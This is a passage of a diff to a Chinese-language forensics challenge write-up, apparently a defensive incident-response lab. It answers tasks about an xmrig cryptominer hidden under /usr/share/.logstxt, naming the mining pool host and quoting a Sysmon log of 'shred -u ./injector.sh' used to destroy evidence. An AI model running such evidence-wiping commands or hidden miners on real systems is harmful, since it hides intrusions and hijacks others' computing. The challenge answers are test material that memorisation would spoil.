+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: [2022-11-24 09:59:49#033[1;30m.437#033[0m] #033[1;37m#033[46;1m#033[1;37m config  #033[0m #033[1;37mconfiguration saved to: "/usr/share/.logstxt/config.json"#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mOPENCL       #033[0m#033[1;31mdisabled#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCUDA         #033[0m#033[1;31mdisabled#033[0m#033[0m
+```
 
+```plaintext title="Answer"
+monero.herominers.com
 ```
 
 ## Task 12
@@ -463,22 +537,34 @@ root      1089     1 2829088 9944 ?        Ssl  14:32 00:29:28 /usr/share/.logst
 
 Task 10 就有
 
+```plaintext title="ip-172-31-13-147-20221124-1501-process-exe-links.txt"
+lrwxrwxrwx 1 root             root             0 Nov 24 14:46 /proc/1089/exe -> /usr/share/.logstxt/xmrig
+```
+
 ```plaintext title="Answer"
-/usr/share/.logstxt/
+/usr/share/.logstxt/xmrig
 ```
 
 ## Task 13
 
 > 我们无法进行取证地恢复用于分析的 “injector.sh” 脚本。我们认为 TA 可能运行了一个命令，阻止我们恢复该文件。TA 运行了哪个命令？
 
-```plaintext title="Answer"
+继续查看 `syslog`
 
+```plaintext
+Nov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.343163000Z"/><EventRecordID>77196</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.344</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-505f-8d8aca550000}</Data><Data Name="ProcessId">4091</Data><Data Name="Image">/usr/bin/shred</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">shred -u ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+```
+
+```plaintext title="Answer"
+shred -u ./injector.sh
 ```
 
 ## Task 14
 
 > 由我们的 IT 管理员创建的 cronjob 为 TA 修改的脚本运行多频繁？
 
-```plaintext title="Answer"
+分析 `syslog` 日志文件，定位每天的固定时间的相同记录即可
 
+```plaintext title="Answer"
+daily - 08:30
 ```
